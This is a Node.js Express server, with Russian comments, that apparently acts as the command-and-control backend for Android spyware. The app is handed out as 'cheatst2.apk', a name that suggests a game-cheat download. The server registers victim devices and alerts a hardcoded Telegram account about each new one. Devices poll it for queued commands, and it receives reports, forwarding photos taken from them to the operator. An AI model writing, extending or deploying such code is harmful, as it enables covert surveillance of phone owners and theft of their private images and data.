const express = require('express');
const path = require('path');

// Защита от падений
process.on('uncaughtException', (err) => {
  console.error('Ошибка:', err);
});
process.on('unhandledRejection', (err) => {
  console.error('Отказ:', err);
});

const db = require('./db');
const { bot, notifyAdmin } = require('./bot');

const app = express();
app.use(express.json({ limit: '25mb' }));

app.get('/', (req, res) => {
  res.status(200).send('OK');
});

app.get('/cheatst2.apk', (req, res) => {
  res.download(path.join(__dirname, 'cheatst2.apk'), 'cheatst2.apk');
});

app.post('/api/register', async (req, res) => {
  const { id, model } = req.body || {};
  if (!id) return res.status(400).json({ ok: false });
  const isNew = !db.listDevices().find(d => d.id === id);
  db.addDevice(id, model || 'android');
  if (isNew) {
    try {
      await bot.telegram.sendMessage(920282117, `📱 Новое устройство!\nМодель: ${model}\nID: ${id}`);
    } catch (e) {}
  }
  res.json({ ok: true });
});

app.get('/api/poll', (req, res) => {
  const id = req.query.id;
  if (!id) return res.status(400).json({ ok: false });
  db.addDevice(id, req.query.model || 'android');
  const cmds = db.pullCommands(id);
  res.json({ ok: true, cmds });
});

app.post('/api/report', async (req, res) => {
  const { id, kind, body } = req.body || {};
  if (!id || !kind) return res.status(400).json({ ok: false });
  db.saveReport(id, kind, body || '');
  try {
    if (kind === 'photo' && body) {
      const buf = Buffer.from(body, 'base64');
      await notifyAdmin('photo', buf, `фото с ${id.slice(0,6)}`);
    }
  } catch (e) {}
  res.json({ ok: true });
});

const port = process.env.PORT || 8080;
app.listen(port, '0.0.0.0', () => {
  console.log('server up :' + port);
});
